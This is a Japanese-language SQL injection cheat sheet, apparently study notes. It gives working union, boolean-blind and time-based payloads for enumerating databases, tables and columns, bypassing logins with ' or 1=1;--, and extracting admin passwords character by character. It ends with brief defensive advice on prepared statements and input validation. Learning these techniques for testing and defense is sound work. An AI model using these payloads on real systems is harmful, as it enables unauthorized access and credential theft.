# SQL インジェクション

## Error Based SQLi

画面で Select している列数を探る

```sql
1 union select 1,2,3
```

存在しないデータと Union したら 1,2,3 が表示されるか？（最初の 1 行だけ画面に表示されるパターン）

```sql
0 union select 1,2,3
```

データベース名

```sql
0 union select 1,2,database()
```

DB 内のテーブル名。group_concat で 1 つにまとめてるのがポイント。

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'データベース名'
```

テーブル内の列名

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'テーブル名'
```

全行を 1 セルに表示する

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users
```

## Blind Based SQLi

DB のデータには興味がなく、ログイン画面をバイパスするような、結果だけを求める場合

```sql
' or 1=1;--
```

## Boolean Based SQLi

データベース名を探索する  
※「このユーザー名は既に存在します」と表示されるような場面で使う

```sql
-- この結果がTrueで
a' UNION SELECT 1,2,3 where database() like '%';--

-- この結果がFalseで
a' UNION SELECT 1,2,3 where database() like 'a%';--

-- この結果がTrueであるとき、sから始まる名前のデータベースが存在することが分かる
-- 2文字目以降も同様に繰り返すことで、全体が判明する
a' UNION SELECT 1,2,3 where database() like 's%';--
```

テーブル名を探索する

```sql
-- Trueであるとき、aから始まるテーブルが存在することが分かる
a' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'データベース名' and table_name like 'a%';--
```

列名を探索する

```sql
-- Trueであるとき、aから始まる列名が存在することが分かる
a' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='データベース名' and TABLE_NAME='テーブル名' and COLUMN_NAME like 'a%';
```

保存されているデータを探索する

```sql
-- Trueであるとき、passwordの1文字目はaであることが分かる
a' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

## Time Based Blind SQLi

Boolean Based と同じだが、結果を画面表示から判別できない場合に、時間遅延で Boolean の判定をする

```sql
-- これがすぐに返り、
a' UNION SELECT SLEEP(5);--

-- これで5秒の遅延が発生する場合、列数が2であることが分かる
a' UNION SELECT SLEEP(5),2;--

-- 遅延が発生する場合、1文字目が4であることが分かる
a' UNION SELECT sleep(5),2 from users where username='admin' and password like '4%';--
```

## セキュリティ

- フレームワークの Prepared Statements を使用する
- 入力検証
- ユーザー入力のエスケープ
